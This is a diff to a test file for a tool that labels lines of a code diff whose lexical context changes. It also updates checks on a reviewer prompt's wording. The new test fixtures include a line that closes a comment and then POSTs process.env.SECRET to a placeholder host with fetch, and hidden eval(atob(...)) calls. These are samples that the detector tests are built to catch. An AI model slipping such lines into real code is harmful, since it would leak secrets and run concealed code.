@@ -259,8 +259,9 @@ describe("the final lexer round", () => {
   });
   test("the reviewer prompt explains an identical pair and its direction", () => {
     const text = require("node:fs").readFileSync(new URL("../src/review.ts", import.meta.url), "utf8");
-    expect(text).toContain("an identical \\`-\\` and \\`+\\` pair marks a line whose lexical context changed");
-    expect(text).toContain("Only code that becomes active (X->code) is a concern");
+    expect(text).toContain("an identical \\`-\\` and \\`+\\` pair marks a line whose lexical context at its start changed");
+    expect(text).toContain("Read the whole line as if it were added code: anything after a closing delimiter or inside a \\${ } hole runs.");
+    expect(text).not.toContain("is a concern");
   });
 });
 
@@ -279,5 +280,30 @@ describe("the last three", () => {
   });
   test("a for after a dot is a property: await after it is not a for-await head", () => {
     expect(added(view("index.js", `obj.for\nawait (p) / 2; /*\n${P}\n*/\n`, `obj.for\nawait (p) / 2;\n${P}\n\n`))).toBe(true);
+  });
+});
+
+describe("the label never calls a running line harmless", () => {
+  const hdr = (out: string) => out.split("\n").filter((l) => l.includes("[context changed"));
+  test("a line that closes a comment and then runs code is labeled code", () => {
+    const line = `*/ fetch("https://example.invalid", {method:"POST", body: process.env.SECRET});`;
+    const out = view("index.js", `const s = \`\n/*\n${line}\n\`;`, `const s = 0;\n/*\n${line}\n\`;`);
+    expect(hdr(out).some((h) => h.endsWith("->code]"))).toBe(true);
+    expect(hdr(out).some((h) => h.includes("->comment]") && out.includes(`+${line}`))).toBe(false);
+  });
+  test("a comment that becomes a template whose hole runs is labeled code", () => {
+    const line = "${eval(atob(D))}";
+    const out = view("index.js", `/*\n${line}\n*/\n`, `\`\n${line}\n\`\n`);
+    expect(hdr(out).join("\n")).toContain("comment->code]");
+  });
+  test("code after a closing delimiter in the middle of the line is labeled code", () => {
+    const line = "x */ eval(D) /* y";
+    const out = view("index.js", `/*\n${line}\n*/\n`, `\n${line}\n\n`);
+    expect(hdr(out).join("\n")).toContain("->code]");
+    expect(hdr(out).join("\n")).not.toContain("->comment]");
+  });
+  test("a line that is wholly comment text keeps its harmless label", () => {
+    const out = view("index.js", `a();\nnotes here\nb();\n`, `a();\n/*\nnotes here\n*/\nb();\n`);
+    expect(hdr(out)).toEqual(["@@ -2 +3 @@ [context changed: code->comment]"]);
   });
 });
